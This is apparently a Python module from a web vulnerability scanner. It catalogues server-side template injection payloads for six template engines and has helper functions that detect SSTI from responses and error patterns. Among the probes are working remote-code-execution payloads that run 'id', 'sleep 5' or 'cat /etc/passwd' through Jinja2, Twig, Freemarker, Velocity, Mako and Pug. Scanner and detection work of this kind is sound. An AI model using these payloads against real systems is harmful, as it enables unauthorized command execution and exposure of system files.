"""SSTI (Server-Side Template Injection) Payload 库 — 按模板引擎分类

检测方法:
1. Math evaluation  — 注入数学表达式({{7*7}})，检查响应中是否出现计算结果(49)
2. Time-based       — 注入 sleep 延迟 payload，通过响应时间判断
3. Blind SSTI       — 两次数学运算交叉验证，排除偶然匹配
4. Engine fingerprint — 通过特殊语法识别具体模板引擎

支持的模板引擎:
- Jinja2 (Python)
- Twig (PHP)
- Freemarker (Java)
- Velocity (Java)
- Mako (Python)
- Jade/Pug (Node.js)
"""

from typing import List, Dict, Optional


# ========== 基础探测 Payload (按模板引擎分类) ==========
# 每个引擎包含: 名称、典型语法、探测 payload、预期输出

ENGINE_PAYLOADS: List[Dict] = [
    {
        "engine": "Jinja2",
        "language": "Python",
        "syntax": "{{ }}",
        "payloads": [
            {"payload": "{{7*7}}", "expected": "49", "type": "math"},
            {"payload": "{{7*'7'}}", "expected": "7777777", "type": "math_str"},
            {"payload": "{{config}}", "expected": None, "type": "info_leak"},
            {"payload": "{{''.__class__.__mro__[2].__subclasses__()}}", "expected": None, "type": "rce_probe"},
            {"payload": "{{self.__init__.__globals__.__builtins__}}", "expected": None, "type": "rce_probe"},
            {"payload": "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}", "expected": None, "type": "rce"},
        ],
    },
    {
        "engine": "Twig",
        "language": "PHP",
        "syntax": "{{ }}",
        "payloads": [
            {"payload": "{{7*7}}", "expected": "49", "type": "math"},
            {"payload": "{{dump(app)}}", "expected": None, "type": "info_leak"},
            {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "expected": None, "type": "rce"},
            {"payload": "{{['cat /etc/passwd']|filter('system')}}", "expected": None, "type": "rce"},
            {"payload": "{{app.request.server.all|join(',')}}", "expected": None, "type": "info_leak"},
        ],
    },
    {
        "engine": "Freemarker",
        "language": "Java",
        "syntax": "${ }",
        "payloads": [
            {"payload": "${7*7}", "expected": "49", "type": "math"},
            {"payload": "${'freemarker'.toUpperCase()}", "expected": "FREEMARKER", "type": "method_call"},
            {"payload": "${product}", "expected": None, "type": "variable_probe"},
            {"payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "expected": None, "type": "rce"},
            {"payload": "${.data_model['class'].forName('java.lang.Runtime').getRuntime().exec('id')}", "expected": None, "type": "rce"},
        ],
    },
    {
        "engine": "Velocity",
        "language": "Java",
        "syntax": "#set / $",
        "payloads": [
            {"payload": "#set($x=7*7)$x", "expected": "49", "type": "math"},
            {"payload": "#set($x='velocity')$x.toUpperCase()", "expected": "VELOCITY", "type": "method_call"},
            {"payload": "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')", "expected": None, "type": "rce"},
        ],
    },
    {
        "engine": "Mako",
        "language": "Python",
        "syntax": "${ } / <% %>",
        "payloads": [
            {"payload": "${7*7}", "expected": "49", "type": "math"},
            {"payload": "${self.module.cache.util.os.system('id')}", "expected": None, "type": "rce"},
            {"payload": "<% import os %>${os.popen('id').read()}", "expected": None, "type": "rce"},
        ],
    },
    {
        "engine": "Jade/Pug",
        "language": "Node.js",
        "syntax": "#{ }",
        "payloads": [
            {"payload": "#{7*7}", "expected": "49", "type": "math"},
            {"payload": "#{global.process.mainModule.require('child_process').execSync('id').toString()}", "expected": None, "type": "rce"},
        ],
    },
]


# ========== 交叉验证 Payload ==========
# 用于确认漏洞: 第一个探测命中后，发送第二个做交叉验证
CONFIRMATION_PAYLOADS = [
    {"payload": "{{8*8}}", "expected": "64"},
    {"payload": "${8*8}", "expected": "64"},
    {"payload": "#set($y=8*8)$y", "expected": "64"},
    {"payload": "#{8*8}", "expected": "64"},
]


# ========== Time-based SSTI Payload ==========
TIME_PAYLOADS = [
    {
        "payload": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('sleep 5').read()}}",
        "engine": "Jinja2",
        "delay": 5,
    },
    {
        "payload": "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('sleep 5').read()}}",
        "engine": "Jinja2",
        "delay": 5,
    },
    {
        "payload": "{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['os'].popen('sleep 5').read()}}",
        "engine": "Jinja2",
        "delay": 5,
    },
    {
        "payload": "{{['sleep 5']|filter('system')}}",
        "engine": "Twig",
        "delay": 5,
    },
    {
        "payload": "${'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('sleep 5')}",
        "engine": "Freemarker",
        "delay": 5,
    },
]


# ========== Blind SSTI 检测 Payload ==========
# 通过乘法结果判断: 发送 {{7*7}} 检查响应中的 "49"
BLIND_MATH_PAYLOADS = [
    {"payload": "{{7*7}}", "expected": "49", "syntax": "{{ }}"},
    {"payload": "${7*7}", "expected": "49", "syntax": "${ }"},
    {"payload": "#set($x=7*7)$x", "expected": "49", "syntax": "#set / $"},
    {"payload": "#{7*7}", "expected": "49", "syntax": "#{ }"},
    {"payload": "<%= 7*7 %>", "expected": "49", "syntax": "<%= %>"},
]


# ========== 引擎指纹识别 Payload ==========
# 发送特殊语法，根据错误信息或特殊输出识别引擎
FINGERPRINT_PAYLOADS = [
    {"payload": "{{'test'.upper()}}", "engine": "Jinja2", "expected": "TEST"},
    {"payload": "${'test'.replaceAll('t','T')}", "engine": "Freemarker/Velocity", "expected": None},
    {"payload": "{{7*'7'}}", "engine": "Jinja2/Twig", "expected": "7777777"},
    {"payload": "{{'test'|upper}}", "engine": "Twig", "expected": "TEST"},
    {"payload": "{%% if 1==1 %%}yes{%% endif %%}", "engine": "Jinja2/Twig", "expected": "yes"},
]


# ========== 引擎错误特征 ==========
ENGINE_ERROR_PATTERNS: Dict[str, List[str]] = {
    "Jinja2": [
        "jinja2",
        "jinja",
        "UndefinedError",
        "TemplateSyntaxError",
        "TemplateNotFound",
        r"jinja2\.exceptions",
        "TemplateAssertionError",
    ],
    "Twig": [
        "Twig_Error",
        "Twig\\\\Error",
        "Twig_Sandbox",
        r"Twig\\\w+Error",
        "in twig",
        "Symfony\\\\Component",
    ],
    "Freemarker": [
        "freemarker",
        "FreeMarkerTemplate",
        "freemarker.core",
        "freemarker.template",
        "InvalidReferenceException",
        "TemplateException",
    ],
    "Velocity": [
        "VelocityContext",
        "velocity.exception",
        "org.apache.velocity",
        "VelocityRuntimeException",
        "ParseErrorException",
    ],
    "Mako": [
        "mako",
        "MakoException",
        "mako.exceptions",
        "mako.template",
        "mako.runtime",
    ],
    "Jade/Pug": [
        "jade",
        "pug",
        "Pug:",
        "at pug",
        "pug.compile",
        "Jade.compile",
    ],
}


# ========== 通用 SSTI 探测 Payload (顺序发送) ==========
# 按语法类型分组，先发送简单的数学运算，再发送复杂的 RCE probe
GENERIC_PROBES = [
    # 第一阶段: 数学运算 (盲检测)
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{7*'7'}}",
    # 第二阶段: 信息泄露 probe
    "{{config}}",
    "{{app}}",
    "{{self}}",
    "${application}",
    "${request}",
    # 第三阶段: RCE probe
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{self.__init__.__globals__.__builtins__}}",
]


# ========== Getter 函数 ==========

def get_ssti_payloads() -> List[Dict]:
    """获取 SSTI 引擎探测 Payload 列表

    Returns:
        List[Dict]: 每个条目包含 engine, language, syntax, payloads
    """
    return ENGINE_PAYLOADS


def get_engine_payloads(engine: str) -> List[Dict] | None:
    """获取指定引擎的 Payload 列表

    Args:
        engine: 引擎名称 (Jinja2, Twig, Freemarker, Velocity, Mako, Jade/Pug)

    Returns:
        引擎的 payloads 列表，未找到返回 None
    """
    for entry in ENGINE_PAYLOADS:
        if entry["engine"].lower() == engine.lower():
            return entry["payloads"]
    return None


def get_confirmation_payloads() -> List[Dict]:
    """获取交叉验证 Payload"""
    return CONFIRMATION_PAYLOADS


def get_blind_math_payloads() -> List[Dict]:
    """获取盲 SSTI 数学运算 Payload"""
    return BLIND_MATH_PAYLOADS


def get_time_payloads() -> List[Dict]:
    """获取 Time-based SSTI Payload"""
    return TIME_PAYLOADS


def get_fingerprint_payloads() -> List[Dict]:
    """获取引擎指纹识别 Payload"""
    return FINGERPRINT_PAYLOADS


def get_generic_probes() -> List[str]:
    """获取通用 SSTI 探测 Payload 字符串列表"""
    return GENERIC_PROBES


def get_engine_error_patterns() -> Dict[str, List[str]]:
    """获取引擎错误特征模式"""
    return ENGINE_ERROR_PATTERNS


# ========== 检测辅助函数 ==========

def detect_ssti_reflection(payload: str, response_text: str) -> Dict:
    """检测响应中是否有 SSTI 反射特征

    核心逻辑:
    1. 检查 Payload 的预期输出是否出现在响应中（例如 {{7*7}} → 49）
    2. 检查响应中是否包含模板引擎错误信息
    3. 返回匹配的引擎名称或 None

    Args:
        payload: 发送的 SSTI Payload
        response_text: HTTP 响应文本

    Returns:
        {
            "detected": bool,           # 是否检测到 SSTI
            "matched_engine": str|None, # 匹配到的引擎名称
            "engine_confidence": str,   # "high" / "medium" / "low"
            "evidence": str,            # 匹配证据
            "method": str,              # 检测方法: "math" / "info_leak" / "error" / "rce"
        }
    """
    result = {
        "detected": False,
        "matched_engine": None,
        "engine_confidence": "low",
        "evidence": "",
        "method": "unknown",
    }

    response_lower = response_text.lower()

    # 1) 检查 Payload 的预期计算结果是否出现在响应中
    for entry in ENGINE_PAYLOADS:
        for p in entry["payloads"]:
            if p["payload"] == payload and p.get("expected"):
                expected = p["expected"]
                if expected in response_text:
                    result["detected"] = True
                    result["matched_engine"] = entry["engine"]
                    result["engine_confidence"] = "medium" if p["type"] == "math" else "low"
                    result["evidence"] = f"Payload 预期输出 `{expected}` 出现在响应中"
                    result["method"] = p["type"]

                    # 如果是 info_leak 或 rce 类型，置信度提升
                    if p["type"] in ("info_leak", "rce"):
                        result["engine_confidence"] = "high"
                    return result

    # 2) 通用数学检测: payload 含 7*7，响应含 49
    if "7*7" in payload and "49" in response_text:
        result["detected"] = True
        result["evidence"] = "数学运算结果 `49` 出现在响应中"

        # 根据语法推断引擎
        if "{{" in payload and "}}" in payload:
            result["matched_engine"] = "Jinja2/Twig"
            result["engine_confidence"] = "medium"
        elif "${" in payload and "}" in payload:
            result["matched_engine"] = "Freemarker/Mako"
            result["engine_confidence"] = "medium"
        elif "#set" in payload:
            result["matched_engine"] = "Velocity"
            result["engine_confidence"] = "medium"
        elif "#{" in payload:
            result["matched_engine"] = "Jade/Pug"
            result["engine_confidence"] = "medium"

        result["method"] = "math"
        return result

    # 3) 检查是否触发了模板引擎错误
    import re
    for engine, patterns in ENGINE_ERROR_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                result["detected"] = True
                result["matched_engine"] = engine
                result["engine_confidence"] = "high"
                result["evidence"] = f"响应中出现 {engine} 错误特征: `{pattern}`"
                result["method"] = "error"
                return result

    # 4) 检查是否有 Python/Java 栈回溯（未分类引擎）
    stack_trace_patterns = [
        r"Traceback \(most recent call last\)",
        r"File \"[^\"]+\", line \d+",
        r"\w+Error:",
        r"at \w+\.\w+\([\w.]+:\d+\)",
        r"Exception in thread",
    ]
    for pattern in stack_trace_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            result["detected"] = True
            result["evidence"] = f"响应中出现异常栈回溯"
            result["method"] = "error"
            result["engine_confidence"] = "low"
            return result

    return result


def detect_engine_from_error(error_text: str) -> str | None:
    """根据错误信息识别模板引擎

    Args:
        error_text: 错误/异常文本

    Returns:
        引擎名称，无法识别返回 None
    """
    import re
    for engine, patterns in ENGINE_ERROR_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, error_text, re.IGNORECASE):
                return engine
    return None


def get_syntax_for_engine(engine: str) -> str:
    """获取引擎的语法特征

    Args:
        engine: 引擎名称

    Returns:
        语法描述字符串
    """
    syntax_map = {
        "Jinja2": "{{ }} / {% %}",
        "Twig": "{{ }} / {% %}",
        "Freemarker": "${ } / <# >",
        "Velocity": "#set / $var",
        "Mako": "${ } / <% %>",
        "Jade/Pug": "#{ }",
    }
    return syntax_map.get(engine, "unknown")
